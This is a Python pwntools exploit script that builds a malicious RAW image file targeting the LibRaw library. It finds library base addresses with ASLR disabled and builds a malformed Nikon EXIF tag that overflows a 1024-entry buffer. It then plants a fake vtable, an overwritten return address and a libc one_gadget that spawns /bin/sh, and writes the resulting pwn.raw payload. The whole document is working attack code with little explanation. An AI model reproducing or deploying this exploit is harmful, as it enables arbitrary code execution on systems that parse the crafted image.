#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from re import L, split
from pwn import *
import subprocess
from colorama import Fore, Back, Style

target = "./raw-identify"

with log.progress("Identifying library load locations"):
    libs = {
        it[0]: int(it[-1].strip("()"), 16) + 0x9000 # ldd output is off by 0x9000
        for it in (
            line.decode().split()
            for line in subprocess.run(
                f"setarch `uname -m` -R ldd {target}",
                shell=True,
                capture_output=True
            ).stdout.splitlines()
        )
    }

log.info(f"{Fore.YELLOW}libraw.so.16{Style.RESET_ALL} @ {Fore.CYAN}{libs['libraw.so.16']:#x}{Style.RESET_ALL}")
log.info(f"{Fore.YELLOW}libc.so.6{Style.RESET_ALL} @ {Fore.CYAN}{libs['libc.so.6']:#x}{Style.RESET_ALL}")

LIBRAW_BASE = libs['libraw.so.16']
LIBC_BASE = libs['libc.so.6']

LIBRAW_RET_HANDLER_OFF = 0x71984 + 1

# one_gadget /lib/x86_64-linux-gnu/libc.so.6
# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#  [r15] == NULL || r15 == NULL
#  [rdx] == NULL || rdx == NULL
LIBC_ONE_GADGET_OFF = 0xe3b01

context.arch = "amd64"
context.bits = "64"
context.os = "linux"

def main():
    nikon_fake_capture_note = fit(
        {
            0: p32(0x76a43207), #tag
            4+14: p32(0), #i
            8+14: p16(0xf1f2), #flip
        },
        length=24
    )

    throw_trigger = fit(
        {  0: p16(1),
           2: p16(0xe01), # tag
           4: p16(0x1), # type
           6: p32(22*1025), #len
           10: p32(0x393d+1), # relative offset of nikon_fake_capture_note.
           14: nikon_fake_capture_note*1025 # We only have space for 1024!
        }
    )

    libraw_obj = fit(
        {
            0x00: LIBC_BASE + 0x1b1730, # requires leak, vtable
            0x08: p64(0xdeadbeef),
            0xbc: b"pwnd" 
        }
    )

    pl = fit(
        {   0: b"ev=-1 mlux=-1 exp=29938 ag=256 focus=255 gain_r=1.707 gain_b=1.628 greenness=0 ccm=6748,-2174,-474,-1482,7032,-1448,378,-2916,6638,0,0,0 md=0 tg=0 0 oth=0 0 b=0 f=0 0 fi=0 ISP Build Date: Oct 22 2020, 14:06:56 VC_BUILD_ID_VERSION: 74e754ff8947c58d2773253f77f6f68a303188f8 (clean) VC_BUILD_ID_USER: dom VC_BUILD_ID_BRANCH: bcm2711_2",
            0x440: p64(0x00),
            0x448: p64(LIBRAW_BASE + LIBRAW_RET_HANDLER_OFF), # saved return
            0x458: p64(LIBC_BASE + LIBC_ONE_GADGET_OFF),
            0x3640: libraw_obj,
        },
    )

    with open('/tmp/pl.bin', 'wb') as f:
        f.write(pl)

    with open('/tmp/trigger.bin', 'wb') as f:
        f.write(throw_trigger)

    ui.pause()

    with log.progress("Replacing exif tags"):
        subprocess.run(
            [
                "/bin/replace_tags",
                "-i", "rpi.raw",
                "-o", "pwn.raw",
                "-t", "/tmp/trigger.bin",
                "-p", "/tmp/pl.bin"
            ],
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )
    log.success(f"Created Payload Image: {Fore.LIGHTGREEN_EX}pwn.raw{Style.RESET_ALL}",)

if __name__ == '__main__':
    main()
